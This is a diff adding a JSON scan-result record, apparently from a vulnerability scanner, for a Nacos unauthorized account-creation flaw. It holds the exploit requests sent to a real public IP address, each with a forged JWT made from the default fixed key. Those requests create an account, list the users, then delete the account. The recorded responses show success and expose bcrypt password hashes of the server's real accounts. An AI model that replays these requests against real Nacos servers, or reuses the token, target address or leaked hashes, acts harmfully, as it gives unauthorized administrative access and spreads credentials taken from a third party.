@@ -1,0 +1,43 @@
+{
+    "nacos-create-user": {
+        "info": {
+            "name": "Alibaba Nacos - Unauthorized Account Creation",
+            "author": "SleepingBag945",
+            "severity": "high",
+            "description": "Nacos uses a fixed JWT token key to authenticate users in the default configuration. Since Nacos is an open source project, the key is publicly known, so unauthorized attackers can use this fixed key to forge any user identity Log in to Nacos to manage and operate background interface functions.\n",
+            "reference": [
+                "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/nacos-token-create-user.yaml"
+            ],
+            "classification": {
+                "cpe": "cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*"
+            },
+            "metadata": {
+                "verified": true,
+                "max-request": 3,
+                "vendor": "alibaba",
+                "product": "nacos",
+                "shodan-query": "title:\"Nacos\""
+            },
+            "tags": "misconfig,nacos,unauth,bypass,instrusive"
+        },
+        "targets": [
+            {
+                "target": "http://43.139.95.53:8848",
+                "req_resp": [
+                    {
+                        "req": "POST /nacos/v1/auth/users/?username=666&password=123456666&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1\r\nHOST: 43.139.95.53\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nHost: 43.139.95.53:8848\r\nContent-Length: 0\r\n\r\n",
+                        "resp": "HTTP/1.1 200\r\nVary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers\r\nContent-Security-Policy: script-src 'self'\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\nDate: Fri, 21 Mar 2025 14:29:51 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n{\"code\":200,\"message\":null,\"data\":\"create user ok!\"}"
+                    },
+                    {
+                        "req": "GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1\r\nHOST: 43.139.95.53\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nHost: 43.139.95.53:8848\r\n\r\n",
+                        "resp": "HTTP/1.1 200\r\nVary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers\r\nContent-Security-Policy: script-src 'self'\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\nDate: Fri, 21 Mar 2025 14:29:51 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n{\"totalCount\":8,\"pageNumber\":1,\"pagesAvailable\":1,\"pageItems\":[{\"username\":\"aaaaaaaasaaaaaaa\",\"password\":\"$2a$10$CvX4.q9.yhC.PPeDkhGkfONOleyf/E7RXJ6rRdlEvx/uWNM1XWl8e\"},{\"username\":\"nacos5213047\",\"password\":\"$2a$10$DHciEv8Y6K7lIHdPlVrfR.HrTFuME.rlaJuJtJd3Jb9dXRG4eYP5e\"},{\"username\":\"nacos79204\",\"password\":\"$2a$10$vefO/.W12di1IurBFshT9eSD01ud0ByNiwomiZQw6DneMqhXEJZSu\"},{\"username\":\"NacosAD\",\"password\":\"$2a$10$KGKnPDHYx1IbpGG2xHtXcekGNeWfDkCzlzQxp8CKlr73UXu9KG.KS\"},{\"username\":\"sktt\",\"password\":\"$2a$10$krkm/pKo.5wln1lIM9C0luvwBVjE4rupHq1sBsicxjwW0dmV18ol2\"},{\"username\":\"nacos59086\",\"password\":\"$2a$10$72YIbkjJq4uTCVYWetk4P.4j3rcKjFiEG6IFoiSE5dPCyqYGHoxoy\"},{\"username\":\"nacos6789\",\"password\":\"$2a$10$aKonS1aVf.zusUgb2LKw5.E4umlgeqKQPC5TbnTheqyGsPKjBB4GK\"},{\"username\":\"666\",\"password\":\"$2a$10$U1NVzPRLRoIODI.sq3P1oe562bEs9IPE15ATjQrqQ31ybIZc3Wyy2\"}]}"
+                    },
+                    {
+                        "req": "DELETE /nacos/v1/auth/users/?username=666&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1\r\nHOST: 43.139.95.53\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nHost: 43.139.95.53:8848\r\nContent-Length: 0\r\n\r\n",
+                        "resp": "HTTP/1.1 200\r\nVary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers\r\nContent-Security-Policy: script-src 'self'\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\nDate: Fri, 21 Mar 2025 14:29:51 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n{\"code\":200,\"message\":null,\"data\":\"delete user ok!\"}"
+                    }
+                ]
+            }
+        ]
+    }
+}
